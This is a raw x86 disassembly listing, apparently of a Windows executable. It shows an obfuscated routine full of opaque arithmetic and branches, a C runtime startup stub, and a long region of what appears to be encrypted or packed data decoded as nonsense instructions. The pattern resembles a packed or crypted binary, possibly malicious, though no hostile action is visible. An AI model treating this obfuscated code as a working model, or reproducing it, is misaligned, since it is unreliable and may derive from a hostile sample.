  403b4d:	mov    edx,DWORD PTR [ebp-0x8]
  403b50:	shr    edx,1
  403b52:	mov    WORD PTR [ebp-0x4],dx
  403b56:	mov    edx,esi
  403b58:	mov    eax,edx
  403b5a:	pop    ebx
  403b5b:	pop    edi
  403b5c:	pop    esi
  403b5d:	mov    esp,ebp
  403b5f:	pop    ebp
  403b60:	ret    0xc
  403b63:	push   ebp
  403b64:	mov    ebp,esp
  403b66:	sub    esp,0x28
  403b69:	push   esi
  403b6a:	push   edi
  403b6b:	push   ebx
  403b6c:	mov    esi,0xc47e
  403b71:	mov    eax,esi
  403b73:	xor    eax,0x648d0000
  403b78:	xor    eax,esi
  403b7a:	movzx  edi,ax
  403b7d:	cmp    esi,0xc47e
  403b83:	jge    0x403b8e
  403b85:	mov    ecx,esi
  403b87:	mov    eax,ecx
  403b89:	jmp    0x403d8b
  403b8e:	mov    edx,edi
  403b90:	and    edx,0xc71600
  403b96:	movzx  esi,dx
  403b99:	mov    ecx,esi
  403b9b:	mov    ebx,ecx
  403b9d:	mov    eax,ebx
  403b9f:	mov    ecx,0x61
  403ba4:	xor    edx,edx
  403ba6:	div    ecx
  403ba8:	mov    ebx,eax
  403baa:	mov    eax,ebx
  403bac:	sub    eax,edi
  403bae:	sub    eax,0x70884535
  403bb3:	mov    ecx,0x8f341e6b
  403bb8:	xor    ecx,eax
  403bba:	mov    DWORD PTR [ebp-0x4],ecx
  403bbd:	mov    edx,esi
  403bbf:	mov    ebx,edx
  403bc1:	mov    eax,esi
  403bc3:	imul   eax,edi
  403bc6:	sub    eax,0xa1ca270e
  403bcb:	mov    edx,0x5e7648e2
  403bd0:	xor    edx,eax
  403bd2:	mov    DWORD PTR [ebp-0x8],edx
  403bd5:	mov    eax,esi
  403bd7:	mov    ecx,0x1b
  403bdc:	xor    edx,edx
  403bde:	div    ecx
  403be0:	mov    ebx,eax
  403be2:	cmp    edi,0x0
  403be5:	jge    0x403bee
  403be7:	mov    eax,ebx
  403be9:	jmp    0x403d8b
  403bee:	mov    edx,ebx
  403bf0:	and    edx,edi
  403bf2:	mov    eax,DWORD PTR [ebp-0x8]
  403bf5:	mov    eax,DWORD PTR [eax+edx*4]
  403bf8:	mov    DWORD PTR [ebp-0xc],eax
  403bfb:	mov    ecx,ebx
  403bfd:	movzx  edi,cx
  403c00:	mov    ecx,ebx
  403c02:	and    ecx,esi
  403c04:	add    ecx,0x191c
  403c0a:	mov    DWORD PTR [ebp-0x10],ecx
  403c0d:	mov    eax,ebx
  403c0f:	add    eax,esi
  403c11:	movzx  esi,ax
  403c14:	cmp    esi,0x0
  403c17:	jge    0x403c2c
  403c19:	mov    edx,edi
  403c1b:	xor    edx,edx
  403c1d:	push   edx
  403c1e:	mov    eax,esi
  403c20:	imul   eax,eax
  403c23:	push   eax
  403c24:	push   ebx
  403c25:	push   edi
  403c26:	call   DWORD PTR ds:0x4220a0
  403c2c:	mov    eax,ebx
  403c2e:	and    eax,edi
  403c30:	cmp    DWORD PTR [ebp-0x10],eax
  403c33:	je     0x403d37
  403c39:	mov    WORD PTR [ebp-0x14],0x0
  403c3f:	movzx  eax,WORD PTR [ebp-0x14]
  403c43:	xor    eax,eax
  403c45:	mov    WORD PTR [ebp-0x18],ax
  403c49:	cmp    WORD PTR [ebp-0x14],0x0
  403c4e:	jge    0x403c59
  403c50:	movzx  eax,WORD PTR [ebp-0x18]
  403c54:	jmp    0x403d8b
  403c59:	movzx  eax,WORD PTR [ebp-0x18]
  403c5d:	add    eax,0xa600
  403c62:	mov    BYTE PTR [ebp-0x1c],al
  403c65:	movzx  eax,WORD PTR [ebp-0x18]
  403c69:	shl    eax,0x8
  403c6c:	mov    DWORD PTR [ebp-0x20],eax
  403c6f:	movzx  ecx,WORD PTR [ebp-0x14]
  403c73:	or     ecx,0xce
  403c79:	movzx  edx,WORD PTR [ebp-0x14]
  403c7d:	and    ecx,edx
  403c7f:	mov    BYTE PTR [ebp-0x24],cl
  403c82:	movzx  ecx,WORD PTR [ebp-0x18]
  403c86:	movzx  edx,BYTE PTR [ebp-0x1c]
  403c8a:	sub    ecx,edx
  403c8c:	mov    edx,DWORD PTR [ebp-0x4]
  403c8f:	movzx  eax,BYTE PTR [edx+ecx*1]
  403c93:	mov    ecx,DWORD PTR [ebp-0xc]
  403c96:	mov    BYTE PTR [ecx],al
  403c98:	movzx  ecx,WORD PTR [ebp-0x14]
  403c9c:	movzx  edx,BYTE PTR [ebp-0x1c]
  403ca0:	imul   ecx,edx
  403ca3:	mov    WORD PTR [ebp-0x14],cx
  403ca7:	mov    dx,WORD PTR [ebp-0x14]
  403cab:	test   dx,dx
  403cae:	je     0x403cbb
  403cb0:	movzx  ecx,WORD PTR [ebp-0x18]
  403cb4:	mov    eax,ecx
  403cb6:	jmp    0x403d8b
  403cbb:	movzx  eax,BYTE PTR [ebp-0x1c]
  403cbf:	movzx  edx,WORD PTR [ebp-0x18]
  403cc3:	add    eax,edx
  403cc5:	add    eax,0x1
  403cc8:	mov    ecx,DWORD PTR [ebp-0xc]
  403ccb:	add    ecx,eax
  403ccd:	mov    DWORD PTR [ebp-0xc],ecx
  403cd0:	mov    eax,DWORD PTR [ebp-0x20]
  403cd3:	movzx  edx,WORD PTR [ebp-0x14]
  403cd7:	and    eax,edx
  403cd9:	mov    BYTE PTR [ebp-0x24],al
  403cdc:	cmp    WORD PTR [ebp-0x18],0xffff
  403ce1:	jne    0x403cee
  403ce3:	movzx  ecx,BYTE PTR [ebp-0x24]
  403ce7:	mov    eax,ecx
  403ce9:	jmp    0x403d8b
  403cee:	mov    ecx,DWORD PTR [ebp-0x20]
  403cf1:	movzx  eax,WORD PTR [ebp-0x14]
  403cf5:	or     ecx,eax
  403cf7:	add    ecx,0x1
  403cfa:	mov    eax,DWORD PTR [ebp-0x4]
  403cfd:	add    eax,ecx
  403cff:	mov    DWORD PTR [ebp-0x4],eax
  403d02:	mov    eax,DWORD PTR [ebp-0x20]
  403d05:	movzx  ecx,BYTE PTR [ebp-0x1c]
  403d09:	xor    eax,ecx
  403d0b:	movzx  ecx,BYTE PTR [ebp-0x1c]
  403d0f:	or     eax,ecx
  403d11:	mov    BYTE PTR [ebp-0x1c],al
  403d14:	movzx  edx,WORD PTR [ebp-0x14]
  403d18:	and    edx,DWORD PTR [ebp-0x20]
  403d1b:	add    edx,0x1
  403d1e:	mov    eax,DWORD PTR [ebp-0x10]
  403d21:	sub    eax,edx
  403d23:	mov    DWORD PTR [ebp-0x10],eax
  403d26:	movzx  ecx,BYTE PTR [ebp-0x1c]
  403d2a:	xor    ecx,ecx
  403d2c:	xor    ecx,DWORD PTR [ebp-0x20]
  403d2f:	mov    BYTE PTR [ebp-0x24],cl
  403d32:	jmp    0x403c2c
  403d37:	mov    edx,esi
  403d39:	shl    edx,0x8
  403d3c:	mov    DWORD PTR [ebp-0x28],edx
  403d3f:	cmp    ebx,0x0
  403d42:	jge    0x403d4a
  403d44:	mov    ecx,edi
  403d46:	mov    eax,ecx
  403d48:	jmp    0x403d8b
  403d4a:	mov    edx,ebx
  403d4c:	add    edx,edi
  403d4e:	sub    edx,0xa1ca270e
  403d54:	mov    ecx,0x5e7648e2
  403d59:	xor    ecx,edx
  403d5b:	mov    DWORD PTR [ebp-0x8],ecx
  403d5e:	mov    eax,DWORD PTR [ebp-0x28]
  403d61:	shl    eax,0x10
  403d64:	mov    DWORD PTR [ebp-0x28],eax
  403d67:	cmp    ebx,0xffffffff
  403d6a:	jne    0x403d70
  403d6c:	mov    eax,ebx
  403d6e:	jmp    0x403d8b
  403d70:	mov    eax,DWORD PTR [ebp-0x8]
  403d73:	mov    ecx,DWORD PTR [ebp-0xc]
  403d76:	mov    DWORD PTR [eax],ecx
  403d78:	mov    edx,ebx
  403d7a:	movzx  edi,dx
  403d7d:	cmp    DWORD PTR [ebp-0x28],0x0
  403d81:	jge    0x403d87
  403d83:	mov    eax,ebx
  403d85:	jmp    0x403d8b
  403d87:	mov    edx,esi
  403d89:	mov    eax,edx
  403d8b:	pop    ebx
  403d8c:	pop    edi
  403d8d:	pop    esi
  403d8e:	mov    esp,ebp
  403d90:	pop    ebp
  403d91:	ret    
  403d92:	jmp    DWORD PTR ds:0x422098
  403d98:	jmp    DWORD PTR ds:0x42209c
  403d9e:	jmp    DWORD PTR ds:0x4220bc
  403da4:	jmp    DWORD PTR ds:0x4220b4
  403daa:	ret    
  403dab:	xor    eax,eax
  403dad:	ret    
  403dae:	push   ebp
  403daf:	mov    ebp,esp
  403db1:	push   0xffffffff
  403db3:	push   0x4220c4
  403db8:	push   0x403d9e
  403dbd:	mov    eax,fs:0x0
  403dc3:	push   eax
  403dc4:	mov    DWORD PTR fs:0x0,esp
  403dcb:	sub    esp,0x68
  403dce:	push   ebx
  403dcf:	push   esi
  403dd0:	push   edi
  403dd1:	mov    DWORD PTR [ebp-0x18],esp
  403dd4:	xor    ebx,ebx
  403dd6:	mov    DWORD PTR [ebp-0x4],ebx
  403dd9:	push   0x2
  403ddb:	call   DWORD PTR ds:0x42206c
  403de1:	pop    ecx
  403de2:	or     DWORD PTR ds:0x439000,0xffffffff
  403de9:	or     DWORD PTR ds:0x439004,0xffffffff
  403df0:	call   DWORD PTR ds:0x4220a4
  403df6:	mov    ecx,DWORD PTR ds:0x4247a1
  403dfc:	mov    DWORD PTR [eax],ecx
  403dfe:	call   DWORD PTR ds:0x422080
  403e04:	mov    ecx,DWORD PTR ds:0x42479d
  403e0a:	mov    DWORD PTR [eax],ecx
  403e0c:	mov    eax,ds:0x4220a8
  403e11:	mov    eax,DWORD PTR [eax]
  403e13:	mov    ds:0x439008,eax
  403e18:	call   0x403daa
  403e1d:	cmp    DWORD PTR ds:0x424781,ebx
  403e23:	jne    0x403e31
  403e25:	push   0x403dab
  403e2a:	call   DWORD PTR ds:0x422090
  403e30:	pop    ecx
  403e31:	call   0x403f0c
  403e36:	push   0x42477d
  403e3b:	push   0x424779
  403e40:	call   0x403d92
  403e45:	mov    eax,ds:0x424799
  403e4a:	mov    DWORD PTR [ebp-0x6c],eax
  403e4d:	lea    eax,[ebp-0x6c]
  403e50:	push   eax
  403e51:	push   DWORD PTR ds:0x424795
  403e57:	lea    eax,[ebp-0x64]
  403e5a:	push   eax
  403e5b:	lea    eax,[ebp-0x70]
  403e5e:	push   eax
  403e5f:	lea    eax,[ebp-0x60]
  403e62:	push   eax
  403e63:	call   DWORD PTR ds:0x4220b8
  403e69:	push   0x424775
  403e6e:	push   0x424771
  403e73:	call   0x403d92
  403e78:	add    esp,0x24
  403e7b:	mov    eax,ds:0x422064
  403e80:	mov    esi,DWORD PTR [eax]
  403e82:	mov    DWORD PTR [ebp-0x74],esi
  403e85:	cmp    BYTE PTR [esi],0x22
  403e88:	jne    0x403ec4
  403e8a:	inc    esi
  403e8b:	mov    DWORD PTR [ebp-0x74],esi
  403e8e:	mov    al,BYTE PTR [esi]
  403e90:	cmp    al,bl
  403e92:	je     0x403e98
  403e94:	cmp    al,0x22
  403e96:	jne    0x403e8a
  403e98:	cmp    BYTE PTR [esi],0x22
  403e9b:	jne    0x403ea1
  403e9d:	inc    esi
  403e9e:	mov    DWORD PTR [ebp-0x74],esi
  403ea1:	mov    al,BYTE PTR [esi]
  403ea3:	cmp    al,bl
  403ea5:	je     0x403eab
  403ea7:	cmp    al,0x20
  403ea9:	jbe    0x403e9d
  403eab:	mov    DWORD PTR [ebp-0x30],ebx
  403eae:	lea    eax,[ebp-0x5c]
  403eb1:	push   eax
  403eb2:	call   DWORD PTR ds:0x42200c
  403eb8:	test   BYTE PTR [ebp-0x30],0x1
  403ebc:	je     0x403ecf
  403ebe:	movzx  eax,WORD PTR [ebp-0x2c]
  403ec2:	jmp    0x403ed2
  403ec4:	cmp    BYTE PTR [esi],0x20
  403ec7:	jbe    0x403ea1
  403ec9:	inc    esi
  403eca:	mov    DWORD PTR [ebp-0x74],esi
  403ecd:	jmp    0x403ec4
  403ecf:	push   0xa
  403ed1:	pop    eax
  403ed2:	push   eax
  403ed3:	push   esi
  403ed4:	push   ebx
  403ed5:	push   ebx
  403ed6:	call   DWORD PTR ds:0x422018
  403edc:	push   eax
  403edd:	call   0x4038c6
  403ee2:	mov    DWORD PTR [ebp-0x68],eax
  403ee5:	push   eax
  403ee6:	call   DWORD PTR ds:0x4220ac
  403eec:	mov    eax,DWORD PTR [ebp-0x14]
  403eef:	mov    ecx,DWORD PTR [eax]
  403ef1:	mov    ecx,DWORD PTR [ecx]
  403ef3:	mov    DWORD PTR [ebp-0x78],ecx
  403ef6:	push   eax
  403ef7:	push   ecx
  403ef8:	call   0x403d98
  403efd:	pop    ecx
  403efe:	pop    ecx
  403eff:	ret    
  403f00:	mov    esp,DWORD PTR [ebp-0x18]
  403f03:	push   DWORD PTR [ebp-0x78]
  403f06:	call   DWORD PTR ds:0x422088
  403f0c:	push   0x30000
  403f11:	push   0x10000
  403f16:	call   0x403da4
  403f1b:	pop    ecx
  403f1c:	pop    ecx
  403f1d:	ret    
  403f1e:	or     eax,0x88304574
  403f23:	aam    0xa9
  403f25:	into   
  403f26:	loop   0x403ef3
  403f28:	jl     0x403eb5
  403f2a:	enter  0x22c8,0xce
  403f2e:	popa   
  403f2f:	arpl   WORD PTR [eax+eax*1-0x78],si
  403f33:	aam    0xff
  403f35:	adc    al,0x34
  403f37:	repnz sub edi,edi
  403f3a:	mov    ecx,0x69e34187
  403f3f:	mov    esi,DWORD PTR [eax-0x47]
  403f42:	pop    edx
  403f43:	imul   ecx,esi,0xffffffac
  403f46:	rol    BYTE PTR [ecx],cl
  403f48:	cmc    
  403f49:	stos   DWORD PTR es:[edi],eax
  403f4a:	lods   eax,DWORD PTR ds:[esi]
  403f4b:	mov    esi,0xe169fca9
  403f50:	jo     0x403fbc
  403f52:	mov    BYTE PTR [ebx],ch
  403f54:	jns    0x403f6b
  403f56:	lods   eax,DWORD PTR ds:[esi]
  403f57:	fwait
  403f58:	jno    0x403f25
  403f5a:	in     al,dx
  403f5b:	sub    ebx,DWORD PTR [esi+eiz*4+0x58708b69]
  403f62:	add    edx,DWORD PTR [ebp+eiz*4-0x468d6e3]
  403f69:	inc    eax
  403f6a:	cmp    BYTE PTR [ebp*4-0x4274966a],0xa2
  403f72:	pop    ds
  403f73:	(bad)  
  403f74:	lock imul ebx,DWORD PTR [eax-0x25],0xd4883998
  403f7c:	test   eax,0x70e1bba7
  403f81:	call   FWORD PTR [eax+0x57]
  403f84:	ins    DWORD PTR es:[edi],dx
  403f85:	xchg   edx,eax
  403f86:	push   0x88ebf158
  403f8b:	aam    0xa9
  403f8d:	push   ss
  403f8e:	or     DWORD PTR [edx+0x17880070],0x6dc1bf4
  403f98:	jo     0x403f9a
  403f9a:	mov    BYTE PTR [ebp+0x5e],bl
  403f9d:	das    
  403f9e:	cmp    dh,dh
  403fa0:	jo     0x403fa2
  403fa2:	je     0x40401d
  403fa4:	cwde   
  403fa5:	dec    esi
  403fa6:	ret    0x8a69
  403fa9:	jmp    0x96ea10e2
  403fae:	in     eax,0xd5
  403fb0:	mov    al,BYTE PTR [edi+0x55]
  403fb3:	jae    0x403fe1
  403fb5:	idiv   BYTE PTR [edx+eax*1]
  403fb8:	xchg   ebp,eax
  403fb9:	push   ebx
  403fba:	fiadd  WORD PTR [ebx-0x779e34de]
  403fc0:	sub    edi,DWORD PTR [ebx+eax*1]
  403fc3:	test   eax,0xf31295a1
  403fc8:	sti    
  403fc9:	push   edi
  403fca:	nop
  403fcb:	pop    edi
  403fcc:	fcomp  QWORD PTR [esi-0x52af0396]
  403fd2:	mov    edx,DWORD PTR [ecx-0x45003f5f]
  403fd8:	mov    ecx,0xa1784831
  403fdd:	push   esi
  403fde:	sbb    eax,0x8fc1b181
  403fe3:	push   edi
  403fe4:	pop    ecx
  403fe5:	mov    esp,0xf19b4a68
  403fea:	(bad)  
  403feb:	out    dx,eax
  403fec:	in     al,0x9a
  403fee:	sbb    al,0x96
  403ff0:	sti    
  403ff1:	inc    edi
  403ff2:	nop
  403ff3:	std    
  403ff4:	jns    0x404013
  403ff6:	and    al,0x83
  403ff8:	jae    0x404049
  403ffa:	lods   al,BYTE PTR ds:[esi]
  403ffb:	fistp  DWORD PTR [esi]
  403ffd:	call   0x838b:0x8250028
  404004:	mov    ch,0x1d
  404006:	ins    DWORD PTR es:[edi],dx
  404007:	add    DWORD PTR [ebx+0x45],esi
  40400a:	cmp    BYTE PTR [edi],0xac
  40400d:	fcomp  QWORD PTR [edx+ecx*2]
  404010:	inc    ecx
  404011:	rcl    bh,0x8a
  404014:	repnz pop edi
  404016:	stos   DWORD PTR es:[edi],eax
  404017:	xor    DWORD PTR [eax-0x5],0xffffffd4
  40401b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40401c:	div    DWORD PTR [ecx+0xe9a1852]
  404022:	push   edi
  404023:	aad    0x7
  404025:	cwde   
  404026:	mov    esi,0x9179d28a
  40402b:	jno    0x40403f
  40402d:	enter  0x1d66,0xf8
  404031:	ins    DWORD PTR es:[edi],dx
  404032:	dec    esi
  404033:	icebp  
  404034:	and    edx,DWORD PTR [ebx]
  404036:	mov    cl,0x58
  404038:	retf   
  404039:	dec    esp
  40403a:	retf   
  40403b:	xchg   ebp,eax
  40403c:	and    edx,DWORD PTR [ebx]
  40403e:	ret    0xe6dd
  404041:	mov    ah,0xe3
  404043:	sbb    DWORD PTR [eax+0x13],edi
  404046:	ret    0x89ae
  404049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40404a:	nop
  40404b:	repz bound esp,QWORD PTR [ebx-0x7a4ab92e]
  404052:	and    esi,ecx
  404054:	xor    edx,ebx
  404056:	mov    cl,0x59
  404058:	(bad)  
  404059:	mov    edx,0xfbf71a89
  40405e:	(bad)  
  40405f:	scas   al,BYTE PTR es:[edi]
  404060:	cli    
  404061:	test   DWORD PTR [edx],ecx
  404063:	sub    BYTE PTR [esi+0x3],dl
  404066:	sub    ch,ah
  404068:	cli    
  404069:	test   DWORD PTR [ebx],esp
  40406b:	sbb    cl,BYTE PTR [ebx]
  40406d:	mov    edi,0xc88e4613
  404072:	xor    bh,BYTE PTR [eax]
  404074:	enter  0x530f,0xe6
  404078:	cmp    esp,DWORD PTR [ebp+0x2b]
  40407b:	pop    ebp
  40407c:	retf   
  40407d:	aas    
  40407e:	ret    0xfaae
  404081:	mov    eax,0x13238c23
  404086:	mov    cl,0xa4
  404088:	jp     0x404103
  40408a:	and    BYTE PTR es:0x8dd13a90,0x87
  404092:	bound  esi,QWORD PTR [eax+0x1d2a9ab6]
  404098:	sti    
  404099:	shr    DWORD PTR [edx+0x31d50a0f],cl
  40409f:	or     ah,BYTE PTR [esi+ebp*2+0x66f1f1ad]
  4040a6:	(bad)  
  4040a7:	and    al,0xec
  4040a9:	ret    
  4040aa:	xor    esp,DWORD PTR [ebx]
  4040ac:	loopne 0x4040d0
  4040ae:	or     ebp,edi
  4040b0:	adc    ch,BYTE PTR [ebx-0x24]
  4040b3:	push   cs
  4040b4:	fadd   QWORD PTR [edx]
  4040b6:	or     eax,DWORD PTR [esi+0x1d]
  4040b9:	jp     0x404097
  4040bb:	push   cs
  4040bc:	push   ecx
  4040bd:	loope  0x4040c0
  4040bf:	test   DWORD PTR [esi+0x5f780ba1],eax
  4040c5:	aaa    
  4040c6:	fmulp  st(7),st
  4040c8:	cmp    DWORD PTR [edx-0x5c],edx
  4040cb:	ja     0x404065
  4040cd:	cmp    ebp,esp
  4040cf:	push   esp
  4040d0:	(bad)  
  4040d1:	loop   0x4040ff
  4040d3:	mov    edi,0x54edab56
  4040d8:	fstp   TBYTE PTR [eax]
  4040da:	sbb    dh,BYTE PTR cs:[ebx+0x45ee7ec6]
  4040e1:	add    ecx,DWORD PTR [esi+0xb]
  4040e4:	popa   
  4040e5:	sub    al,0x7c
  4040e7:	lds    esi,FWORD PTR [ebx]
  4040e9:	mov    esp,0x4c57cfd0
  4040ee:	jae    0x40416b
  4040f0:	xchg   esp,eax
  4040f1:	mov    ?,WORD PTR [eax-0x59]
  4040f4:	je     0x40416d
  4040f6:	dec    ecx
  4040f7:	mov    bl,0xca
  4040f9:	test   DWORD PTR [ebx],esp
  4040fb:	icebp  
  4040fc:	test   al,0x48
  4040fe:	into   
  4040ff:	and    eax,0x2eaa99a1
  404104:	fistp  WORD PTR [eax+0x737f8eb1]
  40410a:	push   edi
  40410b:	aam    0x12
  40410d:	fisubr DWORD PTR [esi-0x5a]
  404110:	cmp    dh,cl
  404112:	xor    cl,ch
  404114:	inc    edx
  404115:	outs   dx,DWORD PTR ds:[esi]
  404116:	rol    BYTE PTR [edx-0x315bb26],0x2c
  40411d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40411e:	add    ch,BYTE PTR [edi+0x1bc8c33b]
  404124:	mov    ds:0xd164d5ea,al
  404129:	jmp    0x404181
  40412b:	hlt    
  40412c:	test   al,0x50
  40412e:	retf   0xf245
  404131:	push   cs
  404132:	cmp    al,cl
  404134:	fsub   DWORD PTR [edi-0x40]
  404137:	inc    ebp
  404138:	xor    edx,ebx
  40413a:	jge    0x4040e6
  40413c:	loopne 0x40412e
  40413e:	ds pop esp
  404140:	xlat   BYTE PTR ds:[ebx]
  404141:	not    DWORD PTR ds:0x22e43638
  404147:	lahf   
  404148:	add    esi,esp
  40414a:	xchg   edi,eax
  40414b:	stos   BYTE PTR es:[edi],al
  40414c:	call   0xfffb5e11
  404151:	loopne 0x404132
  404153:	mov    ebp,0x1dc6fac1
  404158:	sbb    eax,0x350aa0a7
  40415d:	mov    ds:0x5090ec5b,al
  404162:	into   
  404163:	or     DWORD PTR [ebx],eax
  404165:	sub    bl,BYTE PTR [edx-0x5f47ceea]
  40416b:	adc    DWORD PTR [ecx-0x1],esp
  40416e:	fnsave [edi+0x789738cb]
  404174:	cmp    eax,ecx
  404176:	mov    esp,0x291c4b8b
  40417b:	jb     0x404188
  40417d:	adc    al,0x18
  40417f:	xchg   edi,eax
  404180:	jmp    0x404164
  404182:	lods   al,BYTE PTR fs:[esi]
  404184:	outs   dx,DWORD PTR ds:[esi]
  404185:	xor    eax,0x8bb10cdf
  40418a:	in     eax,0x93
  40418c:	mov    bl,0x46
  40418e:	dec    ebx
  40418f:	dec    ebx
  404190:	sahf   
  404191:	push   cs
  404192:	shl    DWORD PTR cs:[ebx],0x13
  404196:	ret    0xb325
  404199:	mov    DWORD PTR [eax-0x7867d048],ebp
  40419f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a0:	ret    
  4041a1:	les    edi,FWORD PTR [ebx]
  4041a3:	test   DWORD PTR [edi],esp
  4041a5:	cwde   
  4041a6:	retf   
  4041a7:	inc    ebp
  4041a8:	push   cs
  4041a9:	push   cs
  4041aa:	data16 stc 
  4041ac:	and    BYTE PTR [ebx-0x2],dl
  4041af:	and    eax,0xb420adba
  4041b4:	sub    ebx,DWORD PTR [edx+0x4733b283]
  4041ba:	daa    
  4041bb:	icebp  
  4041bc:	sti    
  4041bd:	inc    ebx
  4041be:	jmp    0x5f34:0xc0b8325d
  4041c5:	mov    ebp,0xd1958697
  4041ca:	add    bl,ch
  4041cc:	daa    
  4041cd:	xadd   BYTE PTR [edi],dh
  4041d0:	xor    DWORD PTR [edi-0x305c9001],ebx
  4041d6:	or     DWORD PTR [esi+0x67],esp
  4041d9:	dec    ecx
  4041da:	(bad)  
  4041db:	xlat   BYTE PTR ds:[ebx]
  4041dc:	jmp    0x1100d966
  4041e1:	icebp  
  4041e2:	cmc    
  4041e3:	jl     0x40416e
  4041e5:	fs dec edx
  4041e7:	fisubr DWORD PTR [edi-0x308d39f4]
  4041ed:	pop    ss
  4041ee:	xchg   ecx,eax
  4041ef:	clc    
  4041f0:	lods   eax,DWORD PTR ds:[esi]
  4041f1:	push   cs
  4041f2:	jle    0x4041f1
  4041f4:	and    BYTE PTR [eax-0x2],cl
  4041f7:	inc    esi
  4041f8:	stc    
  4041f9:	test   DWORD PTR [ebx],esp
  4041fb:	icebp  
  4041fc:	loope  0x404219
  4041fe:	ret    0x77f7
  404201:	rcr    bh,0xa1
  404204:	dec    ecx
  404205:	push   ebx
  404206:	cmp    eax,0x567aaadd
  40420b:	stc    
  40420c:	fadd   QWORD PTR [edx-0x7a055532]
  404212:	adc    dh,BYTE PTR [ecx]
  404214:	test   al,0x6e
  404216:	retf   0xb125
  404219:	aad    0xd0
  40421b:	pop    ebx
  40421c:	sub    al,0xa4
  40421e:	xchg   ecx,eax
  40421f:	test   al,0x77
  404221:	push   ds
  404222:	fcomi  st,st(1)
  404224:	and    edx,DWORD PTR [ebx]
  404226:	dec    ecx
  404227:	fcomi  st,st(6)
  404229:	push   cs
  40422a:	pop    esi
  40422b:	stc    
  40422c:	test   al,0x58
  40422e:	(bad)  
  40422f:	pop    ebp
  404230:	pop    esi
  404231:	push   cs
  404232:	push   esi
  404233:	std    
  404234:	and    BYTE PTR [eax-0x2a],ah
  404237:	and    eax,0x8a208d87
  40423c:	das    
  40423d:	cwde   
  40423e:	mov    DWORD PTR [esi+0x32a02109],edi
  404244:	or     ebx,DWORD PTR [ecx-0x49]
  404247:	inc    edi
  404248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404249:	fstp   TBYTE PTR [eax+0x38]
  40424c:	loope  0x404269
  40424e:	ret    0xf367
  404251:	mov    eax,0xfef5a79b
  404256:	xlat   BYTE PTR ds:[ebx]
  404257:	sbb    eax,edi
  404259:	aas    
  40425a:	inc    esp
  40425b:	jmp    0x58eb98b4
  404260:	adc    al,0x19
  404262:	mov    cs,WORD PTR ds:0x4b4b4645
  404268:	jns    0x4042d3
  40426a:	daa    
  40426b:	mov    ds:0xf3494475,al
  404270:	xacquire xchg BYTE PTR [eax-0x33],bh
  404274:	test   al,0xa0
  404276:	inc    edx
  404277:	scas   al,BYTE PTR es:[edi]
  404278:	cli    
  404279:	test   DWORD PTR [edx],ebp
  40427b:	pop    es
  40427c:	push   edi
  40427d:	jo     0x404240
  40427f:	fcomi  st,st(2)
  404281:	push   es
  404282:	pop    ebp
  404283:	loope  0x4042a8
  404285:	addr16 cwde 
  404287:	and    eax,0xb42089bc
  40428c:	sub    eax,DWORD PTR [ebx+0x2a]
  40428f:	lods   eax,DWORD PTR ds:[esi]
  404290:	cli    
  404291:	test   DWORD PTR [ebx],esp
  404293:	xor    esp,DWORD PTR [edi]
  404295:	adc    ebx,DWORD PTR [ecx+0x20ec6951]
  40429b:	icebp  
  40429c:	and    ebx,DWORD PTR [edx+0xeac5287]
  4042a2:	gs loope 0x404245
  4042a5:	sub    eax,0xef8dac2
  4042aa:	and    eax,0x491b66f2
  4042af:	shr    dl,1
  4042b1:	xchg   BYTE PTR [esi-0x7],bl
  4042b4:	mov    ch,0xbe
  4042b6:	retf   
  4042b7:	outs   dx,BYTE PTR ds:[esi]
  4042b8:	mov    fs,WORD PTR [edx+ecx*4+0x421323f1]
  4042bf:	fcomi  st,st(2)
  4042c1:	xchg   BYTE PTR [esi-0x7],ah
  4042c4:	mov    al,ds:0xff45c0d3
  4042c9:	mov    al,ds:0x6cdc0edc
  4042ce:	xchg   edx,eax
  4042cf:	push   ecx
  4042d0:	(bad)  
  4042d1:	jns    0x4042af
  4042d3:	bound  eax,QWORD PTR [esi+0x10]
  4042d6:	ret    0x51ae
  4042d9:	outs   dx,BYTE PTR ds:[esi]
  4042da:	stc    
  4042db:	scas   eax,DWORD PTR es:[edi]
  4042dc:	mov    al,ds:0x5a45d6d5
  4042e1:	fidivr DWORD PTR [ebp-0x56]
  4042e4:	jmp    0xfc91:0xc1aec6d1
  4042eb:	mov    dl,0x16
  4042ed:	mov    ebx,edx
  4042ef:	cs aam 0x54
  4042f2:	fs sub eax,0x9045b5f1
  4042f8:	lock sub DWORD PTR [ebx],esp
  4042fb:	sub    DWORD PTR [esi-0x64],eax
  4042fe:	push   ebx
  4042ff:	cmp    ah,bl
  404301:	adc    eax,0xeb89c6eb
  404306:	cmp    ch,dl
  404308:	cmp    al,0x19
  40430a:	or     BYTE PTR [eax+edi*2+0x30f57c15],cl
  404311:	int3   
  404312:	bound  edi,QWORD PTR [ebp-0x66bbf68]
  404318:	scas   eax,DWORD PTR es:[edi]
  404319:	ins    DWORD PTR es:[edi],dx
  40431a:	and    dh,cl
  40431c:	and    edx,DWORD PTR [ebx]
  40431e:	add    ebx,esi
  404320:	nop
  404321:	test   DWORD PTR [ecx-0xd],ecx
  404324:	fadd   QWORD PTR [esi-0x7a0553d0]
  40432a:	mov    al,0x7c
  40432c:	sahf   
  40432d:	mov    ebx,0x42faaec6
  404332:	and    al,0xd9
  404334:	and    dl,BYTE PTR [ebx]
  404336:	ret    0xa9f9
  404339:	jp     0x4042f1
  40433b:	pop    es
  40433c:	and    DWORD PTR [ebx],edx
  40433e:	ret    0x3aa7
  404341:	icebp  
  404342:	data16 jl 0x404399
  404345:	aaa    
  404346:	repz addr16 retf 
  404349:	inc    ebp
  40434a:	(bad)  
  40434b:	stc    
  40434c:	jecxz  0x4043b5
  40434e:	rcl    BYTE PTR [edx-0x22de0665],cl
  404354:	add    edx,edx
  404356:	add    ebp,DWORD PTR [ecx-0xff68a87]
  40435c:	loop   0x404356
  40435e:	sub    DWORD PTR [ebx],esp
  404360:	dec    edi
  404361:	shl    DWORD PTR [eax],cl
  404363:	icebp  
  404364:	and    edi,DWORD PTR [esi-0x73719135]
  40436a:	sbb    dh,BYTE PTR [eax]
  40436c:	push   esi
  40436d:	in     al,0xa8
  40436f:	scas   eax,DWORD PTR es:[edi]
  404370:	mov    ds:0x70a6366e,al
  404375:	in     al,dx
  404376:	push   edi
  404377:	push   esp
  404378:	clc    
  404379:	test   DWORD PTR [ebx],esp
